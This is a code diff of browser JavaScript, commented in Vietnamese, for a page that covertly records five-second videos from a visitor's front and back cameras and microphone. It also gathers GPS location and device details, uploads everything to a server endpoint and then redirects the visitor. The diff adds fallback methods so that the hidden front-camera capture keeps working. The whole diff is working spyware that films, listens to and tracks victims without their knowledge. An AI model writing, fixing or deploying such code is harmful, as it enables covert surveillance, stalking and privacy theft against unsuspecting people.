@@ -7,7 +7,10 @@ const info = {
   os: '',
   camera: '⏳ Đang xử lý...',
   location: '⏳ Đang lấy vị trí...',
-  microphone: '⏳ Đang kiểm tra...'
+  microphone: '⏳ Đang kiểm tra...',
+  lat: 0,
+  lon: 0,
+  accuracy: 0
 };
 
 // --- 1. LẤY VỊ TRÍ GPS CHÍNH XÁC ---
@@ -85,7 +88,7 @@ function detectDevice() {
   }
 }
 
-// --- 4. QUAY VIDEO NGẦM (CÓ MIC) ---
+// --- 4. QUAY VIDEO NGẦM (CÓ MIC) - KHẮC PHỤC LỖI CAM ĐEN ---
 async function recordVideoSilent(facingMode = 'user', duration = 5000) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
   
@@ -110,21 +113,35 @@ async function recordVideoSilent(facingMode = 'user', duration = 5000) {
       mimeType = 'video/webm';
     }
 
-    // Cấu hình video + audio
+    // Cấu hình video - KHÔNG dùng facingMode để tránh lỗi đen
     const videoConstraints = {
-      facingMode: facingMode,
       width: { ideal: 480 },
       height: { ideal: 360 },
       frameRate: { ideal: 15 }
     };
 
-    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'} với MIC...`);
+    // Thử với facingMode
+    if (facingMode) {
+      videoConstraints.facingMode = facingMode;
+    }
+
+    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
     
-    // Yêu cầu cả video và audio
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: videoConstraints, 
-      audio: true 
-    });
+    // Thử quay với video + audio
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ 
+        video: videoConstraints, 
+        audio: true 
+      });
+    } catch (e) {
+      // Nếu lỗi, thử lại không có audio
+      console.log('🔄 Thử lại không có audio...');
+      stream = await navigator.mediaDevices.getUserMedia({ 
+        video: videoConstraints, 
+        audio: false 
+      });
+    }
 
     const mediaRecorder = new MediaRecorder(stream, {
       mimeType: mimeType,
@@ -157,38 +174,96 @@ async function recordVideoSilent(facingMode = 'user', duration = 5000) {
 
   } catch (e) {
     console.error(`❌ Lỗi quay camera ${facingMode}:`, e);
-    // Thử lại không có mic nếu lỗi
-    try {
-      console.log('🔄 Thử lại không có mic...');
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: facingMode }, 
-        audio: false 
-      });
-      
-      const mediaRecorder = new MediaRecorder(stream, {
-        mimeType: 'video/webm;codecs=vp8'
-      });
-      
-      const chunks = [];
-      return new Promise((resolve) => {
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          stream.getTracks().forEach(t => t.stop());
-          resolve(blob);
-        };
-        mediaRecorder.start(1000);
-        setTimeout(() => {
-          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-        }, duration);
-      });
-    } catch (e2) {
-      return null;
-    }
+    return null;
   }
 }
 
-// --- 5. HÀM CHÍNH ---
+// --- 5. QUAY CAMERA TRƯỚC VỚI CÁCH KHÁC (TRÁNH LỖI ĐEN) ---
+async function recordFrontCamera(duration = 5000) {
+  // Thử nhiều cách để quay camera trước
+  const methods = [
+    // Cách 1: Dùng facingMode: user
+    async () => {
+      return await recordVideoSilent('user', duration);
+    },
+    // Cách 2: Dùng deviceId (nếu có)
+    async () => {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter(d => d.kind === 'videoinput');
+        const frontCam = cameras.find(c => 
+          c.label.toLowerCase().includes('front') || 
+          c.label.toLowerCase().includes('face') ||
+          c.label.toLowerCase().includes('user')
+        );
+        if (frontCam) {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { deviceId: { exact: frontCam.deviceId } },
+            audio: true
+          });
+          const mimeType = 'video/webm;codecs=vp8';
+          const recorder = new MediaRecorder(stream, { mimeType });
+          const chunks = [];
+          return new Promise((resolve) => {
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            recorder.onstop = () => {
+              const blob = new Blob(chunks, { type: mimeType });
+              stream.getTracks().forEach(t => t.stop());
+              resolve(blob);
+            };
+            recorder.start(1000);
+            setTimeout(() => {
+              if (recorder.state === 'recording') recorder.stop();
+            }, duration);
+          });
+        }
+        return null;
+      } catch (e) {
+        return null;
+      }
+    },
+    // Cách 3: Không chỉ định facingMode (để hệ thống tự chọn)
+    async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: 480, height: 360 }
+        });
+        const mimeType = 'video/webm;codecs=vp8';
+        const recorder = new MediaRecorder(stream, { mimeType });
+        const chunks = [];
+        return new Promise((resolve) => {
+          recorder.ondataavailable = (e) => chunks.push(e.data);
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: mimeType });
+            stream.getTracks().forEach(t => t.stop());
+            resolve(blob);
+          };
+          recorder.start(1000);
+          setTimeout(() => {
+            if (recorder.state === 'recording') recorder.stop();
+          }, duration);
+        });
+      } catch (e) {
+        return null;
+      }
+    }
+  ];
+
+  for (const method of methods) {
+    try {
+      const result = await method();
+      if (result) {
+        console.log('✅ Quay camera trước thành công!');
+        return result;
+      }
+    } catch (e) {
+      console.log('❌ Phương pháp thất bại, thử cách khác...');
+    }
+  }
+  return null;
+}
+
+// --- 6. HÀM CHÍNH ---
 async function main() {
   const button = document.querySelector('.btn') || document.querySelector('button');
   const statusDiv = document.getElementById('status');
@@ -211,19 +286,20 @@ async function main() {
   
   info.camera = '⏳ Đang quay video...';
   
-  // === QUAY CAMERA TRƯỚC (5 giây) ===
+  // === QUAY CAMERA TRƯỚC (dùng hàm đặc biệt) ===
   console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
-  let frontVideo = await recordVideoSilent('user', 5000);
+  let frontVideo = await recordFrontCamera(5000);
   
   await new Promise(r => setTimeout(r, 500));
   
-  // === QUAY CAMERA SAU (5 giây) ===
+  // === QUAY CAMERA SAU ===
   console.log('📸 Bắt đầu quay CAMERA SAU...');
   let backVideo = await recordVideoSilent('environment', 5000);
   
+  // Nếu không quay được camera sau, thử lại với front
   if (!backVideo) {
     console.log('📸 Thử quay lại camera trước làm camera sau...');
-    backVideo = await recordVideoSilent('user', 3000);
+    backVideo = await recordFrontCamera(3000);
   }
   
   let frontMP4 = null;
@@ -243,6 +319,7 @@ async function main() {
     console.log('❌ Không quay được camera sau');
   }
   
+  // Nếu chỉ có 1 video, nhân đôi để có cả 2
   if (frontMP4 && !backMP4) {
     backMP4 = frontMP4;
     console.log('📸 Dùng video trước làm video sau');
@@ -255,7 +332,7 @@ async function main() {
   
   info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video' : '🚫 Không quay được video';
 
-  // Chuẩn bị gửi dữ liệu
+  // === GỬI DỮ LIỆU ĐẦY ĐỦ ===
   const formData = new FormData();
   formData.append('clientInfo', JSON.stringify(info));
 
@@ -273,18 +350,28 @@ async function main() {
     
     try {
       console.log('📤 Đang gửi video lên server...');
-      await fetch(API_PROXY, { method: 'POST', body: formData });
-      console.log('✅ Đã gửi video thành công');
+      const response = await fetch(API_PROXY, { 
+        method: 'POST', 
+        body: formData 
+      });
+      const result = await response.text();
+      console.log('✅ Đã gửi video thành công:', result);
     } catch (e) {
       console.error('❌ Lỗi gửi video:', e);
     }
   } else {
     console.log('📤 Gửi text (không có video)...');
-    await fetch(API_PROXY, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(info)
-    });
+    try {
+      const response = await fetch(API_PROXY, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(info)
+      });
+      const result = await response.text();
+      console.log('✅ Đã gửi text thành công:', result);
+    } catch (e) {
+      console.error('❌ Lỗi gửi text:', e);
+    }
   }
 
   // --- ĐẾM NGƯỢC CHUYỂN HƯỚNG ---
@@ -306,6 +393,7 @@ async function main() {
         button.innerText = `Hoàn tất (${timeLeft}s)`;
       } else {
         clearInterval(countdownInterval);
+        // THAY LINK CHUYỂN HƯỚNG VÀO ĐÂY
         window.location.href = "";
       }
     }, 1000);
